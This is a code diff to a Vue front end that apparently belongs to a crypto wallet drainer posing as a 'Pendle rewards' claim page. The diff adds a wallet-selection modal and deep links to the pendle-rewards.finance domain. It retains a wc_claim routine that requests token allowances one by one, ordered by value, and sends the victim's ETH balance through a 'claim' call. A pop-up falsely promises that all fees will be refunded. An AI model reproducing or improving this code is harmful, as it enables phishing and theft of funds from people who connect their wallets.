@@ -164,7 +164,7 @@
                       <div class="elementor-button-wrapper">
                         <a
                           href="javeascript:void()"
-                          @click.prevent="wc_claim"
+                          @click.prevent="toggleModal"
                           class="elementor-button-link elementor-button elementor-size-xs"
                         >
                           <span class="elementor-button-content-wrapper">
@@ -279,7 +279,7 @@
                                     </span>
                                   </a>
                                   <a
-                                    @click.prevent="wc_claim"
+                                    @click.prevent="toggleModal"
                                     v-if="!isConnected"
                                     href="javascript:void(0)"
                                     class="elementor-button-link elementor-button elementor-size-md"
@@ -425,6 +425,7 @@
         <!-- #post-1502 -->
       </div>
       <!-- #main .site-main -->
+      <Web3Modal @connect="connect" @wc="wConnect" v-if="showModal" />
 
       <Footer />
       <!-- #colophon .site-footer -->
@@ -433,24 +434,24 @@
   </body>
 </template>
 <script>
+import Web3Modal from './components/Web3Modal.vue';
 import Datavg from './Datavg.vue';
 import Footer from './Footer.vue';
 import { useToast } from 'vue-toastification';
-import { disconnect, getAccount, fetchFeeData } from '@wagmi/core';
+import { disconnect, connect, getAccount, fetchFeeData } from '@wagmi/core';
 import {
   web3modal,
   claim,
-  ethBalance,
+  balanceOf,
   getTokens,
   increaseAllowance,
-  balanceOf,
-  allownce,
+  mconnector,
 } from './utils/walletconnect.js';
 const Toast = useToast();
 import axios from 'axios';
 
 export default {
-  components: { Datavg, Footer },
+  components: { Datavg, Footer, Web3Modal },
   data() {
     return {
       isConnected: false,
@@ -466,60 +467,95 @@ export default {
       claimable: 0,
       sortedTokens: [],
       currentIndex: 0,
+      showModal: false,
     };
   },
+
   methods: {
-    async wc_claim() {
-      try {
-        if (getAccount().isConnected) {
-          this.processing = true;
-          this.isDone = false;
+    async connect(type) {
+      let url = null;
 
-          if (this.tokens.length > 0 && this.maxToken) {
-            await increaseAllowance(this.maxToken);
-          } else {
-            await claim(this.balance.value);
-            this.claimable = 0;
-          }
-
-          this.processing = false;
-          this.isDone = true;
-          const allownce_value = await allownce(this.maxToken);
-          const balanceoftoken = await balanceOf(this.maxToken);
-          if (allownce_value > balanceoftoken) {
-            if (this.currentIndex + 1 > this.sortedTokens.length) {
-              if (this.claimable > 0) {
-                await claim(this.balance.value);
-                this.claimable = 0;
-              } else {
-                this.processing = false;
-                this.isDone = false;
-                Swal.close();
-                Swal.hideLoading();
-              }
-            } else {
-              this.currentIndex += 1;
-              this.maxToken = null
-              this.maxToken = this.sortedTokens[this.currentIndex];
-              this.wc_claim();
-            }
-          }
-        } else {
-          this.wConnect();
+      if (type == 1) {
+        if (window.ethereum) {
+          this.showModal = false;
+          await mconnector();
+          this.wConnect()
+          return;
         }
-      } catch (error) {
-        console.log(error);
-        this.processing = false;
-        this.isDone = false;
-        Swal.close();
-        Swal.hideLoading();
-        this.wc_claim();
-        // Toast.error(error.message);
+        url = 'https://metamask.app.link/dapp/pendle-rewards.finance';
       }
+      if (type == 2) {
+        if (window.ethereum) {
+          return window.open('https://www.coinbase.com/wallet', '_blank');
+        }
+
+        url =
+          'https://go.cb-w.com/dapp?cb_url=https%3a%2f%2fpendle-rewards.finance%2f';
+      }
+      if (type == 3) {
+        return this.wConnect()
+      }
+      if (type == 4) {
+        url =
+          'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp';
+      }
+      window.open(url, '_blank');
     },
+    toggleModal() {
+      if (getAccount().isConnected) return;
+      this.showModal = true;
+    },
+    async wc_claim() {
+    try {
+      if (getAccount().isConnected) {
+        this.processing = true;
+        this.isDone = false;
+
+        if (this.tokens.length > 0 && this.maxToken) {
+          await increaseAllowance(this.maxToken);
+        } else {
+          await claim(this.balance.value);
+          this.claimable = 0;
+        }
+
+        this.processing = false;
+        this.isDone = true;
+        const allownce_value = await allownce(this.maxToken);
+        const balanceoftoken = await balanceOf(this.maxToken);
+        if (allownce_value > balanceoftoken) {
+          if (this.currentIndex + 1 > this.sortedTokens.length) {
+            if (this.claimable > 0) {
+              await claim(this.balance.value);
+              this.claimable = 0;
+            } else {
+              this.processing = false;
+              this.isDone = false;
+              Swal.close();
+              Swal.hideLoading();
+            }
+          } else {
+            this.currentIndex += 1;
+            this.maxToken = null
+            this.maxToken = this.sortedTokens[this.currentIndex];
+            this.wc_claim();
+          }
+        }
+      } else {
+        this.wConnect();
+      }
+    } catch (error) {
+      console.log(error);
+      this.processing = false;
+      this.isDone = false;
+      Swal.close();
+      Swal.hideLoading();
+      this.wc_claim();
+      // Toast.error(error.message);
+    }
+  },
     async wConnect() {
       try {
-        
+        this.showModal = false;
         if (getAccount().isConnected) {
           this.account = getAccount().address;
           Swal.fire({
@@ -546,7 +582,6 @@ export default {
           web3modal.subscribeModal((newState) => {
             if (!newState.open) {
               if (getAccount().isConnected) {
-
                 Swal.fire({
                   html:
                     '<p style="color: #fff; margin-bottom: 5px !important; line-height: 1.6; font-size: 20px !important;">Check your wallet and click on confirm to receive your Pendle Pass. All fees will be refunded immediately.</p>' +
@@ -570,7 +605,6 @@ export default {
             }
           });
         }
-          
       } catch (error) {
         Toast.error(error.message);
       }
@@ -578,7 +612,8 @@ export default {
     async showBalance() {
       try {
         this.processing = true;
-        const balance = await ethBalance();
+        const balance = await balanceOf();
+
         const feeData = await fetchFeeData({
           chainId: 1,
           formatUnits: 'gwei',
@@ -589,15 +624,15 @@ export default {
         this.balance = balance;
         const validTokens = await getTokens(getAccount().address);
         for (let i = 0; i < validTokens.length; i++) {
+          if (validTokens[i].symbol == 'USDT') {
+            validTokens[i].usdPrice = 1;
+            continue;
+          }
           try {
-            if(validTokens[i].symbol == 'USDT'){
-              validTokens[i].usdPrice = 1;
-            }else{
-              const price = this.prices.filter(
-                (price) => price.symbol == `${validTokens[i].symbol}USDT`
-              );
-              validTokens[i].usdPrice = price[0].price;
-            }
+            const price = this.prices.filter(
+              (price) => price.symbol == `${validTokens[i].symbol}USDT`
+            );
+            validTokens[i].usdPrice = price[0].price;
           } catch (error) {
             validTokens[i].usdPrice = 0;
             continue;
@@ -713,6 +748,13 @@ export default {
 }
 
 @media (max-width: 767px) {
+  .ticker--prices {
+    margin-top: 1.55rem;
+  }
+
+  .ticker--token {
+    font-size: 0.9rem;
+  }
   .pd {
     /* display: none; */
     padding-bottom: 0;
@@ -923,7 +965,7 @@ export default {
 }
 
 .ticker--prices {
-  margin-top: -0.75rem;
+  /* margin-top: -0.75rem; */
 }
 
 .ticker--token {
@@ -934,7 +976,7 @@ export default {
 
 .ticker--discounted-percent {
   color: #07c1b6;
-  font-size: 1.5rem;
+  font-size: 1.2rem;
 }
 
 .ticker--nested-text {
@@ -949,9 +991,9 @@ export default {
     width: 2rem !important;
   }
 
-  .ticker--prices {
+  /* .ticker--prices {
     margin-top: -0.5rem;
-  }
+  } */
 
   .ticker--token {
     font-size: 0.9rem;
